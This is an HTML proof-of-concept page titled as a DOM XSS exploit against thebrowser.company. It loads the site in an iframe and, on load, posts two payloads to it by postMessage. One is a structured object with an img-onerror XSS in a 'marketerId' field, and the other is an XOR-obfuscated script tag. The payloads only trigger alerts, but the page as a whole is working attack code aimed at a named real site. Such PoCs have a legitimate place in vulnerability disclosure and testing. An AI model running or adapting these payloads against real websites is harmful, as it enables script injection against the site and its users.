<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ğŸ’¥ DOM XSS Exploit â€“ thebrowser.company</title>
</head>
<body>
  <h2>âœ… DOM XSS PoC â€“ Hybrid Payloads</h2>
  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:2px solid green;"></iframe>

  <script>
    function xorEncode(str, key = 0x66) {
      const keyHex = key.toString(16).padStart(2, '0');
      return keyHex + Array.from(str).map(c =>
        (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
      ).join('');
    }

    const payloadXOR = xorEncode("<script>alert('XSS via XOR')</script>");

    const structuredPayload = {
      message: "OB_SHOULD_SHOW_PICKER",
      content: {
        marketerId: [
          `<img src="x" onerror="alert('XSS via object')">`
        ]
      }
    };

    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("âœ… iframe loaded");

      try {
        // Send both payload types
        iframe.contentWindow.postMessage(structuredPayload, "*");
        console.log("ğŸš€ Structured object postMessage sent.");

        iframe.contentWindow.postMessage(payloadXOR, "*");
        console.log("ğŸš€ XOR payload sent.");
      } catch (e) {
        console.error("âŒ Error sending payloads:", e);
      }
    };
  </script>
</body>
</html>
